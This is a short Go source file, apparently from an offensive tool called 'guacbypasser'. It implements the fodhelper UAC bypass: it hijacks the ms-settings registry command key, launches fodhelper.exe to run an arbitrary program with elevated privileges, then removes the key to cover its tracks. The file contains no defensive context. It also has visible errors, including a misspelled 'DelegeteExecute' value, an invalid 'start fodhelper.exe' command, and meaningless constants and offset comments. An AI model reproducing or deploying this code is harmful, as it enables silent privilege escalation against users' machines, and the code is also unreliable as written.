package guacbypasser

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"golang.org/x/sys/windows/registry"
)

func HWND_W32_Method_Fodhelper(path string) error {
	var wkey32 registry.Key
	var err error

	var c = __W32_Fodhelper__{
		Type:   "_fodhelper",
		Method: "registry-command",
		Scode: [4]uintptr{
			0x01, 0x0911c,
			0xebb, 0x037cb,
		},

		Location:     fmt.Sprintf("%s\\_fodhelper.gUAC", os.Getenv("APPDATA")),
		_K_Fodhelper: 0x2,
	}

	if len(c.Type)&len(c.Method) == 0 {
	} else {
		log.Printf("[*] You have problem with length of `Type` or `Method`")
	}

	// Get ABSOLUTE program path
	// +0x9ff ...

	var currentDir string
	currentDir, err = filepath.Abs(path)
	if err != nil {
		log.Println(err)
	}

	_, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
		registry.SET_VALUE)
	if err != nil {
		log.Println(err)
	}

	wkey32, err = registry.OpenKey(
		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		log.Println(err)
	}

	// Setting DEFAULT key value for the ABSOLUTE program path
	// +0x23df ...

	if err := wkey32.SetStringValue("", currentDir); err != nil {
		log.Println(err)
	}

	// Setting DelegateExecute key value for None-Value program path
	// +0x32cc ...

	if err := wkey32.SetStringValue("DelegeteExecute", ""); err != nil {
		log.Println(err)
	}

	// Absolute key function closing
	// +0x54ef ...

	if err := wkey32.Close(); err != nil {
		log.Println(err)
	}

	// Sleep for 5 seconds ...
	time.Sleep(5 * 1 * time.Second)

	// Executing Fodhelper.exe
	// Executing ABSOLUTE program name with high privileges

	var cmd = exec.Command("start fodhelper.exe")
	err = cmd.Run()

	// Sleep for 5 seconds ...
	time.Sleep(5 * 1 * time.Second)

	// Delete registry key ...
	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`)
	if err != nil {
		log.Println(err)
	}

	return err
}
